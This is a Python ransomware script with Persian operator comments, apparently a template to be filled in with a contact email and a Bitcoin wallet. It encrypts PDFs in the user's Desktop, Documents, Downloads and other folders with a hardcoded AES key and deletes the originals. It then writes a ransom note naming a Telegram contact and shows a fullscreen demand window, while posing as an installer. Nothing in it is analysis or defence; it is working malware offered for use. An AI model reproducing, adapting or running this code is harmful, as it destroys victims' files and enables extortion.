# ایمیلون برای اینکه داخل تکست فایل برای گرفتن پسورد نمایش داده بشه
email = ''
# ادرس ولتتون
BTC = ''
# در لاین 121 و 126 پسورد خودتون رو بگذارید
import os 
try:import glob
except ModuleNotFoundError:os.system("pip install glob")
try:from tkinter import font;import tkinter as tk;from tkinter import *
except ModuleNotFoundError:os.system("pip install tkinter")
try:import pyaes
except ModuleNotFoundError:os.system("pip install pyaes")
try:from pathlib import Path
except ModuleNotFoundError:os.system("pip install pathlib")
try:from colorama import init
except ModuleNotFoundError:
    os.system("pip install colorama")
init()
import platform
#فرمت هایی که میخواید رمزنگاری بشه
lst_arq = ["*.pdf"]

gre,go,re = '\033[01;32m', '\033[00;32m','\033[01;31m'

f =  platform.uname()

dir = ("Desktop", "Downloads", "Documents", "Music", "Pictures", "Videos")
print(f"""{go}

(_)                     / |_          [  |  [  |  
__    _ .--.    .--.   `| |-'  ,--.    | |   | |  
[  |  [ `.-. |  ( (`\]   | |   `'_\ :   | |   | |  
| |   | | | |   `'.'.   | |,  // | |,  | |   | |  
[___] [___||__] [\__) )  \__/  \'-;__/ [___] [___] 

                                            """)

print (f"{re}=========================================")

print (f"{re}[!] {gre}Installing prerequisites... Please wait 5 minutes")

for List in dir:

    try:desktop = Path.home() / List

    except Exception:pass

    if 'Linux' in f:pass
    if 'Windows' in f:os.chdir(desktop)

    def DECRYPT_FILE():

        root= tk.Tk()

        width = root.winfo_screenwidth() 

        height = root.winfo_screenheight()

        canvas1 = tk.Canvas(root, width = width, height = height, bg='black') 

        canvas1.pack() #متن دلخواه یا چیزی که میخواید برای تارگت داخل یک پنجره به نمایش باید

        label1 = tk.Label(root, text='! ! ! Hello fool ! ! !') 

        label1.config(font=('Algerian', int(height/13)))

        label1.config(background='black', foreground='red')

        canvas1.create_window(int(width/2), int(height/15), window=label1)

        label2 = tk.Label(root, text='All files are encrypted with the drive!')

        label2.config(font=('Chiller', int(height/20)))

        label2.config(background='black', foreground='red')

        canvas1.create_window(int(width/2), int(height/20)*8, window=label2)

        label3 = tk.Label(root, text='Transfer and send a message to the email to receive the bitcoin key ') 

        label3.config(font=('Ink Free', int(height/30)))

        label3.config(background='black', foreground='green')

        canvas1.create_window(int(width/2), int(height/20)*9, window=label3)

        label4 = tk.Label(root, text=f'[+] email : {email}') 

        label4.config(font=('helvetica', int(height/50)))

        label4.config(background='green', foreground='red')

        canvas1.create_window(int(width/2), int(height/20)*10, window=label4)

        label5 = tk.Label(root, text=f'[+] BTC : {BTC}') 

        label5.config(font=('helvetica', int(height/50)))

        label5.config(background='green', foreground='red')

        canvas1.create_window(int(width/2), int(height/20)*11, window=label5)

        root.mainloop()

    def criptografando():

        for files in lst_arq:

            for format_file in glob.glob(files):

                try:
                    s = open(f'{desktop}/{format_file}', 'rb')
                except:
                    s = open(f'{desktop}\\{format_file}', 'rb')
                file_data = s.read()
                s.close()
                try:
                     os.remove(f'{desktop}/{format_file}')
                except:
                    os.remove(f'{desktop}\\{format_file}')

                key = b"0ec959fba714573c6a1ccba57113d4a5"  # پسورد 16 بایتی

                aes = pyaes.AESModeOfOperationCTR(key)

                crypto_data = aes.encrypt(file_data)

                new_file = format_file + ".Felurm"
                try:
                     new_file = open(f'{desktop}/{new_file}', 'wb')
                except:
                    new_file = open(f'{desktop}\\{new_file}', 'wb')
                new_file.write(crypto_data)
                new_file.close()

                msg = f'''

                You look stupid!

                Now you can get the password whenever you put the currency



                ------------------------------------------------------------

                email : {email}



                0.00050 BTC : {BTC}

                ------------------------------------------------------------



                id telegram : serverkill3r

                '''

                fp = open('clown.txt', 'w')

                fp.writelines(msg)

                fp.close

    def descrypt(dec_fi):

        try:

            for file in glob.glob('*.Felurm'):

                keybytes = dec_fi.encode()

                name_file = open(file, 'rb')

                file_data = name_file.read()

                dkey = keybytes  # 16 bytes key - change for your key

                daes = pyaes.AESModeOfOperationCTR(dkey)

                decrypt_data = daes.decrypt(file_data)

                format_file = file.split('.')

                new_file_name = format_file[0] + '.' + format_file[1]  # Path to drop file

                try:dnew_file = open(f'{desktop}/{new_file_name}', 'wb')
                except:dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
                
                dnew_file.write(decrypt_data)

                dnew_file.close()

        except ValueError as err:print('Installing.. ')

    criptografando()

    DECRYPT_FILE()

    while True:

        if criptografando:

            key = input(f'\n{go}        Key to decrypt files  : ')

            if key == '0ec959fba714573c6a1ccba57113d4a5':
                descrypt(key)
                for del_file in glob.glob('*.Felurm'):
                    try:os.remove(f'{desktop}/{del_file}')
                    except:os.remove(f'{desktop}\\{del_file}')

                print(f"{gre} Bye Bye !\n")

                break
            else:print(f"{re}The password is wrong!  !\n")
    break

